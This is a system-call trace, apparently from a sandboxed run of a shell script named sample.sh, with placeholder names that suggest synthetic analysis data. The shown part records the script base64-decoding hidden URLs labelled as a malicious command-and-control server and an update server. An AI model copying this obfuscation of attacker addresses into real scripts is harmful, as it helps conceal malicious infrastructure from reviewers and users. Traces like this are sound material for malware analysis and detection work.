15    14:56:48.868255 lseek(0<pipe:[579]>, 0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
15    14:56:48.868646 close(0<pipe:[579]>) = 0
15    14:56:48.869046 write(1<pipe:[4593]>, "http://malicious-command-and-con"..., 62) = 62
9     14:56:48.869363 <... read resumed>"http://malicious-command-and-con"..., 4096) = 62
15    14:56:48.869498 close(1<pipe:[4593]> <unfinished ...>
9     14:56:48.869631 read(3<pipe:[4593]>,  <unfinished ...>
15    14:56:48.869762 <... close resumed>) = 0
15    14:56:48.869917 close(2<pipe:[2810]>) = 0
15    14:56:48.870244 exit_group(0)     = ?
15    14:56:48.870912 +++ exited with 0 +++
13    14:56:48.871050 <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 15
13    14:56:48.871248 rt_sigaction(SIGINT, {sa_handler=0x5efc1b16c540, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=0x5efc1b146750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
13    14:56:48.871590 rt_sigprocmask(SIG_SETMASK, [CHLD], NULL, 8) = 0
13    14:56:48.871912 close(3)          = -1 EBADF (Bad file descriptor)
13    14:56:48.872244 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
13    14:56:48.872567 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=14, si_uid=1001, si_status=0, si_utime=0, si_stime=0} ---
13    14:56:48.872775 wait4(-1, 0x7ffd8d3b0290, WNOHANG, NULL) = -1 ECHILD (No child processes)
13    14:56:48.873189 rt_sigreturn({mask=[]}) = 0
13    14:56:48.873703 exit_group(0)     = ?
9     14:56:48.874332 <... read resumed>"", 4096) = 0
13    14:56:48.874513 +++ exited with 0 +++
9     14:56:48.874664 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=13, si_uid=1001, si_status=0, si_utime=0, si_stime=0} ---
9     14:56:48.874871 wait4(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], WNOHANG, NULL) = 13
9     14:56:48.875234 wait4(-1, 0x7ffd8d3af5d0, WNOHANG, NULL) = -1 ECHILD (No child processes)
9     14:56:48.875560 rt_sigreturn({mask=[INT]}) = 0
9     14:56:48.875918 close(3<pipe:[4593]>) = 0
9     14:56:48.876256 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9     14:56:48.876568 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
9     14:56:48.876923 rt_sigaction(SIGINT, {sa_handler=0x5efc1b146750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
9     14:56:48.877281 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=0x5efc1b146750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
9     14:56:48.877593 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9     14:56:48.877915 read(255</sandbox/sample.sh>, "# \"http://update-server-placehol"..., 1423) = 992
9     14:56:48.878490 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9     14:56:48.878932 pipe2([3<pipe:[586]>, 4<pipe:[586]>], 0) = 0
9     14:56:48.879296 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
9     14:56:48.879630 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9     14:56:48.879956 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9     14:56:48.880280 rt_sigprocmask(SIG_BLOCK, [INT TERM CHLD], [], 8) = 0
9     14:56:48.880656 lseek(255</sandbox/sample.sh>, -813, SEEK_CUR) = 610
9     14:56:48.881038 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7694e368ce50) = 16
16    14:56:48.881581 set_robust_list(0x7694e368ce60, 24 <unfinished ...>
9     14:56:48.881734 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
16    14:56:48.881887 <... set_robust_list resumed>) = 0
9     14:56:48.882028 <... rt_sigprocmask resumed>NULL, 8) = 0
16    14:56:48.882174 getpid( <unfinished ...>
9     14:56:48.882317 rt_sigaction(SIGCHLD, {sa_handler=0x5efc1b144230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7694e36d3330},  <unfinished ...>
16    14:56:48.882467 <... getpid resumed>) = 16
9     14:56:48.882636 <... rt_sigaction resumed>{sa_handler=0x5efc1b144230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7694e36d3330}, 8) = 0
16    14:56:48.882820 close(255</sandbox/sample.sh> <unfinished ...>
9     14:56:48.882989 close(4<pipe:[586]> <unfinished ...>
16    14:56:48.883141 <... close resumed>) = 0
9     14:56:48.883283 <... close resumed>) = 0
16    14:56:48.883426 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
9     14:56:48.883575 rt_sigprocmask(SIG_BLOCK, [INT],  <unfinished ...>
16    14:56:48.883723 <... rt_sigprocmask resumed>NULL, 8) = 0
9     14:56:48.883891 <... rt_sigprocmask resumed>[], 8) = 0
16    14:56:48.884040 rt_sigaction(SIGTSTP, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330},  <unfinished ...>
9     14:56:48.884189 read(3<pipe:[586]>,  <unfinished ...>
16    14:56:48.884338 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
16    14:56:48.884514 rt_sigaction(SIGTTIN, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
16    14:56:48.884848 rt_sigaction(SIGTTOU, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
16    14:56:48.885188 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
16    14:56:48.885562 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
16    14:56:48.885923 rt_sigaction(SIGCHLD, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7694e36d3330}, {sa_handler=0x5efc1b144230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7694e36d3330}, 8) = 0
16    14:56:48.886274 rt_sigaction(SIGCHLD, {sa_handler=0x5efc1b144230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7694e36d3330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7694e36d3330}, 8) = 0
16    14:56:48.886698 rt_sigaction(SIGINT, {sa_handler=0x5efc1b16c540, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
16    14:56:48.887063 dup2(4<pipe:[586]>, 1<pipe:[2809]>) = 1<pipe:[586]>
16    14:56:48.887421 close(4<pipe:[586]>) = 0
16    14:56:48.887751 close(3<pipe:[586]>) = 0
16    14:56:48.888135 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
16    14:56:48.888494 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
16    14:56:48.888827 fcntl(0</dev/null>, F_GETFD) = 0
16    14:56:48.889163 pipe2([3<pipe:[587]>, 4<pipe:[587]>], 0) = 0
16    14:56:48.889640 rt_sigprocmask(SIG_BLOCK, NULL, [CHLD], 8) = 0
16    14:56:48.890339 rt_sigprocmask(SIG_BLOCK, [INT TERM CHLD], [CHLD], 8) = 0
16    14:56:48.890861 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7694e368ce50) = 17
17    14:56:48.891583 set_robust_list(0x7694e368ce60, 24 <unfinished ...>
16    14:56:48.891748 rt_sigprocmask(SIG_SETMASK, [CHLD],  <unfinished ...>
17    14:56:48.891920 <... set_robust_list resumed>) = 0
16    14:56:48.892069 <... rt_sigprocmask resumed>NULL, 8) = 0
17    14:56:48.892222 getpid( <unfinished ...>
16    14:56:48.892376 close(4<pipe:[587]> <unfinished ...>
17    14:56:48.892536 <... getpid resumed>) = 17
16    14:56:48.892713 <... close resumed>) = 0
17    14:56:48.892858 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
16    14:56:48.893003 close(4 <unfinished ...>
17    14:56:48.893154 <... rt_sigprocmask resumed>NULL, 8) = 0
16    14:56:48.893285 <... close resumed>) = -1 EBADF (Bad file descriptor)
17    14:56:48.893428 rt_sigaction(SIGTSTP, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330},  <unfinished ...>
16    14:56:48.893580 rt_sigprocmask(SIG_BLOCK, NULL,  <unfinished ...>
17    14:56:48.893721 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
16    14:56:48.893877 <... rt_sigprocmask resumed>[CHLD], 8) = 0
17    14:56:48.894029 rt_sigaction(SIGTTIN, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330},  <unfinished ...>
16    14:56:48.894166 rt_sigprocmask(SIG_BLOCK, [INT TERM CHLD],  <unfinished ...>
17    14:56:48.894307 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
16    14:56:48.894451 <... rt_sigprocmask resumed>[CHLD], 8) = 0
17    14:56:48.894620 rt_sigaction(SIGTTOU, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330},  <unfinished ...>
16    14:56:48.894779 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD <unfinished ...>
17    14:56:48.894935 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
18    14:56:48.895203 set_robust_list(0x7694e368ce60, 24 <unfinished ...>
17    14:56:48.895371 close(3<pipe:[587]> <unfinished ...>
16    14:56:48.895548 <... clone resumed>, child_tidptr=0x7694e368ce50) = 18
18    14:56:48.895698 <... set_robust_list resumed>) = 0
17    14:56:48.895858 <... close resumed>) = 0
18    14:56:48.896090 getpid( <unfinished ...>
16    14:56:48.896259 rt_sigprocmask(SIG_SETMASK, [CHLD],  <unfinished ...>
18    14:56:48.896410 <... getpid resumed>) = 18
17    14:56:48.896562 dup2(4<pipe:[587]>, 1<pipe:[586]> <unfinished ...>
18    14:56:48.896756 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
16    14:56:48.896930 <... rt_sigprocmask resumed>NULL, 8) = 0
18    14:56:48.897093 <... rt_sigprocmask resumed>NULL, 8) = 0
17    14:56:48.897240 <... dup2 resumed>) = 1<pipe:[587]>
18    14:56:48.897395 rt_sigaction(SIGTSTP, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330},  <unfinished ...>
16    14:56:48.897559 close(3<pipe:[587]> <unfinished ...>
18    14:56:48.897729 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
17    14:56:48.897880 close(4<pipe:[587]> <unfinished ...>
18    14:56:48.898032 rt_sigaction(SIGTTIN, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330},  <unfinished ...>
16    14:56:48.898179 <... close resumed>) = 0
18    14:56:48.898323 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
17    14:56:48.898472 <... close resumed>) = 0
18    14:56:48.898623 rt_sigaction(SIGTTOU, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330},  <unfinished ...>
16    14:56:48.898778 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
18    14:56:48.898930 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
17    14:56:48.899078 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330},  <unfinished ...>
18    14:56:48.899229 dup2(3<pipe:[587]>, 0</dev/null> <unfinished ...>
16    14:56:48.899403 <... rt_sigprocmask resumed>[CHLD], 8) = 0
18    14:56:48.899554 <... dup2 resumed>) = 0<pipe:[587]>
17    14:56:48.899703 <... rt_sigaction resumed>{sa_handler=0x5efc1b16c540, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
18    14:56:48.899853 close(3<pipe:[587]> <unfinished ...>
16    14:56:48.900001 rt_sigprocmask(SIG_SETMASK, [CHLD],  <unfinished ...>
18    14:56:48.900150 <... close resumed>) = 0
17    14:56:48.900292 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330},  <unfinished ...>
18    14:56:48.900444 newfstatat(AT_FDCWD</sandbox>, ".",  <unfinished ...>
16    14:56:48.900608 <... rt_sigprocmask resumed>NULL, 8) = 0
18    14:56:48.900768 <... newfstatat resumed>{st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
17    14:56:48.900915 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
18    14:56:48.901065 newfstatat(AT_FDCWD</sandbox>, "/usr/local/sbin/base64",  <unfinished ...>
16    14:56:48.901217 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
18    14:56:48.901364 <... newfstatat resumed>0x7ffd8d3b0350, 0) = -1 ENOENT (No such file or directory)
17    14:56:48.901507 rt_sigaction(SIGCHLD, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7694e36d3330},  <unfinished ...>
18    14:56:48.901656 newfstatat(AT_FDCWD</sandbox>, "/usr/local/bin/base64",  <unfinished ...>
16    14:56:48.901807 <... rt_sigprocmask resumed>[CHLD], 8) = 0
18    14:56:48.901958 <... newfstatat resumed>0x7ffd8d3b0350, 0) = -1 ENOENT (No such file or directory)
17    14:56:48.902101 <... rt_sigaction resumed>{sa_handler=0x5efc1b144230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7694e36d3330}, 8) = 0
18    14:56:48.902250 newfstatat(AT_FDCWD</sandbox>, "/usr/sbin/base64",  <unfinished ...>
16    14:56:48.902403 rt_sigaction(SIGINT, {sa_handler=0x5efc1b146750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330},  <unfinished ...>
18    14:56:48.902552 <... newfstatat resumed>0x7ffd8d3b0350, 0) = -1 ENOENT (No such file or directory)
17    14:56:48.902740 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
18    14:56:48.902902 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/base64",  <unfinished ...>
16    14:56:48.903057 <... rt_sigaction resumed>{sa_handler=0x5efc1b16c540, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
18    14:56:48.903207 <... newfstatat resumed>{st_mode=S_IFREG|0755, st_size=39432, ...}, 0) = 0
17    14:56:48.903354 <... rt_sigprocmask resumed>[], 8) = 0
18    14:56:48.903501 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/base64",  <unfinished ...>
16    14:56:48.903654 wait4(-1,  <unfinished ...>
18    14:56:48.903797 <... newfstatat resumed>{st_mode=S_IFREG|0755, st_size=39432, ...}, 0) = 0
17    14:56:48.903943 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
18    14:56:48.904089 geteuid( <unfinished ...>
17    14:56:48.904244 <... rt_sigprocmask resumed>NULL, 8) = 0
18    14:56:48.904387 <... geteuid resumed>) = 1001
17    14:56:48.904532 ioctl(2<pipe:[2810]>, TIOCGPGRP <unfinished ...>
18    14:56:48.904691 getegid( <unfinished ...>
17    14:56:48.904833 <... ioctl resumed>, 0x7ffd8d3b0624) = -1 ENOTTY (Inappropriate ioctl for device)
18    14:56:48.904976 <... getegid resumed>) = 1001
17    14:56:48.905118 rt_sigaction(SIGCHLD, {sa_handler=0x5efc1b144230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7694e36d3330},  <unfinished ...>
18    14:56:48.905267 getuid( <unfinished ...>
17    14:56:48.905408 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7694e36d3330}, 8) = 0
18    14:56:48.905556 <... getuid resumed>) = 1001
17    14:56:48.905789 rt_sigaction(SIGINT, {sa_handler=0x5efc1b16c540, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330},  <unfinished ...>
18    14:56:48.905949 getgid( <unfinished ...>
17    14:56:48.906090 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
18    14:56:48.906239 <... getgid resumed>) = 1001
17    14:56:48.906455 fstat(1<pipe:[587]>,  <unfinished ...>
18    14:56:48.906739 access("/usr/bin/base64", X_OK <unfinished ...>
17    14:56:48.906919 <... fstat resumed>{st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
18    14:56:48.907104 <... access resumed>) = 0
17    14:56:48.907304 write(1<pipe:[587]>, "aHR0cDovL3VwZGF0ZS1zZXJ2ZXItcGxh"..., 85 <unfinished ...>
18    14:56:48.907486 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/base64",  <unfinished ...>
17    14:56:48.907649 <... write resumed>) = 85
18    14:56:48.907794 <... newfstatat resumed>{st_mode=S_IFREG|0755, st_size=39432, ...}, 0) = 0
17    14:56:48.907952 exit_group(0 <unfinished ...>
18    14:56:48.908096 geteuid( <unfinished ...>
17    14:56:48.908354 <... exit_group resumed>) = ?
18    14:56:48.908497 <... geteuid resumed>) = 1001
17    14:56:48.908794 +++ exited with 0 +++
18    14:56:48.908957 getegid( <unfinished ...>
16    14:56:48.909109 <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 17
18    14:56:48.909264 <... getegid resumed>) = 1001
16    14:56:48.909440 wait4(-1,  <unfinished ...>
18    14:56:48.909597 getuid()          = 1001
18    14:56:48.909961 getgid()          = 1001
18    14:56:48.910304 access("/usr/bin/base64", R_OK) = 0
18    14:56:48.910712 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=0x5efc1b16c540, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
18    14:56:48.911075 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
18    14:56:48.911465 rt_sigaction(SIGCHLD, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7694e36d3330}, {sa_handler=0x5efc1b144230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7694e36d3330}, 8) = 0
18    14:56:48.911825 execve("/usr/bin/base64", ["base64", "-d"], 0x5efc23a6e620 /* 9 vars */) = 0
18    14:56:48.912636 brk(NULL)         = 0x5e3c8f7c1000
18    14:56:48.913030 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7c4f5bb37000
18    14:56:48.913470 openat(AT_FDCWD</sandbox>, "/lib/libfake_tracer.so", O_RDONLY|O_CLOEXEC) = 3</usr/lib/libfake_tracer.so>
18    14:56:48.914160 read(3</usr/lib/libfake_tracer.so>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
18    14:56:48.914668 fstat(3</usr/lib/libfake_tracer.so>, {st_mode=S_IFREG|0777, st_size=16376, ...}) = 0
18    14:56:48.915176 mmap(NULL, 19160, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0) = 0x7c4f5bb32000
18    14:56:48.915519 mmap(0x7c4f5bb33000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x1000) = 0x7c4f5bb33000
18    14:56:48.915866 mmap(0x7c4f5bb34000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000) = 0x7c4f5bb34000
18    14:56:48.916206 mmap(0x7c4f5bb35000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000) = 0x7c4f5bb35000
18    14:56:48.916575 close(3</usr/lib/libfake_tracer.so>) = 0
18    14:56:48.916995 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
18    14:56:48.917353 openat(AT_FDCWD</sandbox>, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3</etc/ld.so.cache>
18    14:56:48.917709 fstat(3</etc/ld.so.cache>, {st_mode=S_IFREG|0644, st_size=7295, ...}) = 0
18    14:56:48.918046 mmap(NULL, 7295, PROT_READ, MAP_PRIVATE, 3</etc/ld.so.cache>, 0) = 0x7c4f5bb30000
18    14:56:48.918381 close(3</etc/ld.so.cache>) = 0
18    14:56:48.918747 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libc.so.6>
18    14:56:48.919110 read(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\220\243\2\0\0\0\0\0"..., 832) = 832
18    14:56:48.919453 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
18    14:56:48.919788 fstat(3</usr/lib/x86_64-linux-gnu/libc.so.6>, {st_mode=S_IFREG|0755, st_size=2125328, ...}) = 0
18    14:56:48.920123 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
18    14:56:48.920458 mmap(NULL, 2170256, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0) = 0x7c4f5b91e000
18    14:56:48.920805 mmap(0x7c4f5b946000, 1605632, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x28000) = 0x7c4f5b946000
18    14:56:48.921345 mmap(0x7c4f5bace000, 323584, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1b0000) = 0x7c4f5bace000
18    14:56:48.921707 mmap(0x7c4f5bb1d000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1fe000) = 0x7c4f5bb1d000
18    14:56:48.922054 mmap(0x7c4f5bb23000, 52624, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7c4f5bb23000
18    14:56:48.922406 close(3</usr/lib/x86_64-linux-gnu/libc.so.6>) = 0
18    14:56:48.922809 mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7c4f5b91b000
18    14:56:48.923463 arch_prctl(ARCH_SET_FS, 0x7c4f5b91b740) = 0
18    14:56:48.923886 set_tid_address(0x7c4f5b91ba10) = 18
18    14:56:48.924297 set_robust_list(0x7c4f5b91ba20, 24) = 0
18    14:56:48.924688 rseq(0x7c4f5b91c060, 0x20, 0, 0x53053053) = 0
18    14:56:48.925101 mprotect(0x7c4f5bb1d000, 16384, PROT_READ) = 0
18    14:56:48.925452 mprotect(0x7c4f5bb35000, 4096, PROT_READ) = 0
18    14:56:48.925870 mprotect(0x5e3c60a35000, 4096, PROT_READ) = 0
18    14:56:48.926238 mprotect(0x7c4f5bb6f000, 8192, PROT_READ) = 0
18    14:56:48.926658 prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
18    14:56:48.927058 munmap(0x7c4f5bb30000, 7295) = 0
18    14:56:48.927531 getrandom("\x70\x8b\x82\xc0\x14\x1a\xc0\x24", 8, GRND_NONBLOCK) = 8
18    14:56:48.927887 brk(NULL)         = 0x5e3c8f7c1000
18    14:56:48.928217 brk(0x5e3c8f7e2000) = 0x5e3c8f7e2000
18    14:56:48.928576 fadvise64(0<pipe:[587]>, 0, 0, POSIX_FADV_SEQUENTIAL) = -1 ESPIPE (Illegal seek)
18    14:56:48.928964 fstat(0<pipe:[587]>, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
18    14:56:48.929318 read(0<pipe:[587]>, "aHR0cDovL3VwZGF0ZS1zZXJ2ZXItcGxh"..., 4096) = 85
18    14:56:48.929653 read(0<pipe:[587]>, "", 4096) = 0
18    14:56:48.930001 fstat(1<pipe:[586]>, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
18    14:56:48.930357 lseek(0<pipe:[587]>, 0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
18    14:56:48.930757 close(0<pipe:[587]>) = 0
18    14:56:48.931133 write(1<pipe:[586]>, "http://update-server-placeholder"..., 62) = 62
9     14:56:48.931438 <... read resumed>"http://update-server-placeholder"..., 4096) = 62
18    14:56:48.931569 close(1<pipe:[586]> <unfinished ...>
9     14:56:48.931698 read(3<pipe:[586]>,  <unfinished ...>
18    14:56:48.931827 <... close resumed>) = 0
18    14:56:48.931978 close(2<pipe:[2810]>) = 0
18    14:56:48.932291 exit_group(0)     = ?
18    14:56:48.932897 +++ exited with 0 +++
16    14:56:48.933017 <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 18
16    14:56:48.933218 rt_sigaction(SIGINT, {sa_handler=0x5efc1b16c540, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=0x5efc1b146750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
16    14:56:48.933597 rt_sigprocmask(SIG_SETMASK, [CHLD], NULL, 8) = 0
16    14:56:48.933909 close(3)          = -1 EBADF (Bad file descriptor)
16    14:56:48.934252 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
16    14:56:48.934594 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=17, si_uid=1001, si_status=0, si_utime=0, si_stime=0} ---
16    14:56:48.934772 wait4(-1, 0x7ffd8d3b0290, WNOHANG, NULL) = -1 ECHILD (No child processes)
16    14:56:48.935104 rt_sigreturn({mask=[]}) = 0
16    14:56:48.935528 exit_group(0)     = ?
9     14:56:48.936029 <... read resumed>"", 4096) = 0
16    14:56:48.936166 +++ exited with 0 +++
9     14:56:48.936292 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=16, si_uid=1001, si_status=0, si_utime=0, si_stime=0} ---
9     14:56:48.936481 wait4(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], WNOHANG, NULL) = 16
